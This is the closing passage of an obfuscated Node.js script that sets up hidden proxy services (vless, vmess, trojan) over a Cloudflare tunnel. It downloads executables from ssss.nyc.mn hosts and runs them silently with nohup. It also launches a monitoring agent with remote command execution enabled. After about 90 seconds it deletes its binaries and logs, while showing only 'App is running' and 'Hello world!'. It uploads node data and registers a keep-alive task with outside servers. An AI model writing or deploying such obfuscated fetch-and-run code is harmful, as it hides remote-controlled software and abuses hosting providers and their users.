_0x30149f=['false','\x0a\x20\x20tunnel:\x20','84gctmvJ','blackhole','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','127.0.0.1','/api/add-nodes','UPLOAD_URL','\x20-s\x20','length','arch','&fp=firefox&type=ws&host=','2083','Empowerment\x20failed\x20for\x20','axios','9afd1229-b893-40c1-84dd-51e7ce204913','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','listen','has','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/dev/null','existsSync','config.json','exec','\x20failed:\x20','post','xtls-rprx-vision','match','boot.log','tls','PORT','aarch64','toString','2053','env','application/json','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20>/dev/null\x202>&1\x20&','/vless-argo','&path=%2Fvless-argo%3Fed%3D2560#','NEZHA_SERVER','floor','vless','web\x20running\x20error:\x20','set','sub','arm','FILE_PATH','ARGO_DOMAIN:','error','/trojan-argo','test','message','Download\x20','\x0aclient_secret:\x20','forEach','split','20552916jDkFFp','/api/add-subscriptions','del\x20/f\x20/q\x20','get','/tunnel.yml\x20run','Add\x20automatic\x20access\x20task\x20faild:\x20','--tls','tunnel.json','status','filter','none','http\x20server\x20is\x20running\x20on\x20port:','443','includes','./tmp','country_code','freedom','finish','true','data','CFIP','https://amd64.ssss.nyc.mn/web','\x20>/dev/null\x202>&1','pkill\x20-f\x20\x22[','Error\x20reading\x20boot.log:','block','quic','countryCode','tunnel.yml','unlinkSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','text/plain;\x20charset=utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20executing\x20command:\x20','tcp','firefox','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://amd64.ssss.nyc.mn/bot','config.yaml','Nodes\x20uploaded\x20successfully','createWriteStream','map','stream','org','SUB_PATH','send','\x0avless://','isFile','nohup\x20','https://amd64.ssss.nyc.mn/v1','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http','random','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','abcdefghijklmnopqrstuvwxyz','196122jHlGPc','11232YspXtl','from','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/bot','mkdirSync','cdns.doon.eu.org','\x20-p\x20','amd','taskkill\x20/f\x20/im\x20','\x20successfully','51903fXXJgP','Unhandled\x20error\x20in\x20startserver:','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','?encryption=none&security=tls&sni=','readFileSync','stringify','3820cixSer','App\x20is\x20running','readdirSync','22583uvMkTe','UUID','NEZHA_PORT','utf-8','clear','basename','2ndpiHm','\x20already\x20exists','18rPisHY','PROJECT_URL','\x20-c\x20','https://arm64.ssss.nyc.mn/agent','AUTO_ACCESS','1623048JdIuLM','Content-Type','142770qszwNy','path','&path=%2Ftrojan-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','catch','?security=tls&sni=','162WDWjRy','https://oooo.serv00.net/add-url','/vmess-argo?ed=2560','platform','charAt','\x20is\x20running','base64','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','liuyi.hamst.filegear-sg.me','https://ipapi.co/json/','automatic\x20access\x20task\x20added\x20successfully','close','win32','all','log','rm\x20-rf\x20','http://ip-api.com/json/','2096','substring','\x0a\x0atrojan://','Subscription\x20uploaded\x20successfully','\x20-c\x20\x22','\x20is\x20created','ARGO_PORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','8443','sub.txt','unshift','/sub.txt\x20saved\x20successfully','ARGO_AUTH','NAME','fileUrl','push','.exe\x20>\x20nul\x202>&1','Hello\x20world!','arm64','direct','statSync','writeFileSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','pop','chmod','child_process','join'];_0x1eab=function(){return _0x30149f;};return _0x1eab();}function _0x390f(_0x1de72d,_0x12902e){const _0x1eaba2=_0x1eab();return _0x390f=function(_0x390f4c,_0x4aff4f){_0x390f4c=_0x390f4c-0x17a;let _0x49d6cd=_0x1eaba2[_0x390f4c];return _0x49d6cd;},_0x390f(_0x1de72d,_0x12902e);}function cleanFiles(){const _0x7880ae={_0x4c0239:0x206,_0x362ca9:0x1e9,_0x5241f5:0x1f2,_0x557772:0x1f5,_0x24d6c5:0x19a},_0x59f49c={_0x140173:0x1f4},_0x52d124={_0x5d4a34:0x1d5,_0x241a9d:0x1f4,_0x3146f1:0x1f4};setTimeout(()=>{const _0x58f041=_0x390f,_0x2c54cb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c54cb[_0x58f041(_0x7880ae._0x4c0239)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c54cb[_0x58f041(0x206)](phpPath);process[_0x58f041(_0x7880ae._0x362ca9)]===_0x58f041(_0x7880ae._0x5241f5)?exec(_0x58f041(0x186)+_0x2c54cb[_0x58f041(0x211)]('\x20')+'\x20>\x20nul\x202>&1',_0x26dada=>{const _0x5c935b=_0x58f041;console[_0x5c935b(_0x52d124._0x5d4a34)](),console[_0x5c935b(_0x52d124._0x241a9d)]('App\x20is\x20running'),console[_0x5c935b(_0x52d124._0x3146f1)](_0x5c935b(0x1fe));}):exec(_0x58f041(_0x7880ae._0x557772)+_0x2c54cb[_0x58f041(0x211)]('\x20')+_0x58f041(_0x7880ae._0x24d6c5),_0x438669=>{const _0x6a4093=_0x58f041;console[_0x6a4093(0x1d5)](),console['log'](_0x6a4093(0x1cf)),console[_0x6a4093(_0x59f49c._0x140173)](_0x6a4093(0x1fe));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5b8ab2={_0x1015ca:0x1f4,_0x2abf24:0x22c,_0x3fea19:0x1e7,_0x5428a4:0x236,_0x3e34ad:0x1f0,_0x31ab00:0x189},_0x3a6c50=_0x49410c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3a6c50(_0x5b8ab2._0x1015ca)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1ed3a3=await axios[_0x3a6c50(_0x5b8ab2._0x2abf24)](_0x3a6c50(_0x5b8ab2._0x3fea19),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3a6c50(_0x5b8ab2._0x5428a4)}});return console['log'](_0x3a6c50(_0x5b8ab2._0x3e34ad)),_0x1ed3a3;}catch(_0x4ecbbd){return console[_0x3a6c50(0x17c)](_0x3a6c50(_0x5b8ab2._0x31ab00)+_0x4ecbbd['message']),null;}}async function startserver(){const _0x2cebb3={_0x435a96:0x17c},_0x108c0d=_0x49410c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x491ab6){console[_0x108c0d(_0x2cebb3._0x435a96)]('Error\x20in\x20startserver:',_0x491ab6);}}startserver()[_0x49410c(0x1e4)](_0x58044b=>{const _0x1ff851={_0x47bd7b:0x1c8},_0x20348d=_0x49410c;console[_0x20348d(0x17c)](_0x20348d(_0x1ff851._0x47bd7b),_0x58044b);}),app[_0x49410c(0x224)](PORT,()=>console['log'](_0x49410c(0x18f)+PORT+'!'));
